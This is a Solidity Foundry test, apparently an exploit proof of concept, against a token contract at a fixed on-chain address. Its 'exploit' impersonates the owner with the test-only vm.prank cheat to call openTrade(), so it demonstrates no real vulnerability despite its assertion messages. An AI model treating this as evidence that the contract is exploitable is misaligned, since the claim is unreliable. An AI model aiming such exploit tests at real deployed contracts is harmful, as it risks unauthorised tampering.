// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface StarlinkSatire_BEP20 {
    function owner() external view returns (address);
    function openTrade() external;
    function tradeEnabled() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x21032D09Cb4F8949883bdEf62D3F1eb5288259BC;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll get the owner dynamically
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Get the current owner of the contract
        address owner = StarlinkSatire_BEP20(TARGET).owner();

        // Impersonate the owner and call openTrade()
        vm.prank(owner);
        StarlinkSatire_BEP20(TARGET).openTrade();

        // Verify that tradeEnabled is now true
        bool tradeEnabled = StarlinkSatire_BEP20(TARGET).tradeEnabled();
        assertEq(tradeEnabled, true, "tradeEnabled should be true after calling openTrade()");
        assertEq(tradeEnabled, true, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
